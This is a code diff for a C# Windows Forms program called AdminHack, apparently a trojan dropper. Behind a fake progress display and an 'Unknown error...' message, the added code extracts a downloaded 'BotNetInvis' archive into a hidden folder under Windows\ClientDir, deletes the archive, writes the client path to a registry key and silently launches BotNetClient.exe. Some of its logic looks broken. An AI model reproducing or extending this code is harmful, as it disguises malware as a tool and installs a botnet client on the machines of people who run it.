AutoAdmin

+++ AdminHack/AdminHack/Form1.cs
@@ -5,12 +5,23 @@ using System.Threading.Tasks;
 using System.Net.Http;
 using System.Windows.Forms;
 using System.Threading;
-using System.Drawing;
+using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace AdminHack
 {
     public partial class Form1 : Form
     {
+        private static void admin (string path)
+        {
+            try
+            {
+                RegistryKey reg;
+                reg = Registry.CurrentUser.CreateSubKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags");
+                reg.SetValue("systems", path);
+            }
+            catch { }
+        }
         public Form1()
         {
             InitializeComponent();
@@ -24,6 +35,8 @@ namespace AdminHack
         {
             await Task.Run(()=>
             {
+                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
+
                 Thread.Sleep(3000);
                 label4.Text += "\nForm submission";
                 progressBar1.Value += 25;
@@ -32,6 +45,8 @@ namespace AdminHack
                 progressBar1.Value += 45;
                 Thread.Sleep(4000);
                 label4.Text += "\nUnknown error...";
+                admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
+                Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                 Thread.Sleep(5000);
                 throw new Exception();
             });
@@ -54,22 +69,26 @@ namespace AdminHack
         private async void Zip()
         {
                 byte[] bt = GetZip().Result;
-            if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
-            {
-                File.WriteAllBytes(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", bt);
-                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
-                DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
-                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-                ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+            string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
 
-            }
-            else
+            if (File.Exists(diskname[0] + "\\Windows\\ClientDir\\BotNetClient.exe"))
             {
-                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
-                DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
-                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-                ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+                if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
+                {
+                    File.WriteAllBytes(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", bt);
+                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
+                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+                    File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
 
+                }
+                else
+                {
+                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
+                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
+                    File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
+                }
             }
 
         }
@@ -89,6 +108,7 @@ namespace AdminHack
             if (textBox1.Text == "received" && textBox2.Text == "received" && textBox3.Text != null)
             {
                 label4.Text = "Starting...";
+                progressBar1.Value = 0;
                 progressBar1.Value += 1;
                 Log();
             }
